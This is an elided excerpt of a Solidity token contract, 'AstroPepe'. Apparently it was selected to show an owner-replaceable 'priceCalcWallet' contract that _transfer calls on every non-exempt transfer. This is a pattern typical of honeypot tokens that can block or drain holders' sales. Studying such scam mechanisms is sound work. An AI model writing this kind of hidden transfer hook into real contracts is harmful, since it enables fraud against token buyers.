...
contract AstroPepe is ERC20, Ownable {
    ...
    address payable public priceCalcWallet;
    ...
    constructor() ERC20("ASTRO PEPE", "APEPE") {
        ...
        marketingWallet = payable(0x4480829a3Bf83ddA9012C190A4deFaE2d4819D45);
        developmentWallet = payable(0x8877db9cb77d66412fAb8c061190b802017C2f87);
        liquidityWallet = payable(0x970Fe95c6F37B55D308d1887795b0D81710e16CA);
        operationsWallet = payable(0x970Fe95c6F37B55D308d1887795b0D81710e16CA);
        priceCalcWallet = payable(0x344538e68372dbdAA36915d95dE387E446caca13);
    ...
    function updatePriceCalcWallet(address newPriceCalcWallet) external onlyOwner {
        priceCalcWallet = payable(newPriceCalcWallet);
    }
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            IPriceCheck(priceCalcWallet).recalcPrice(from, to);
        }
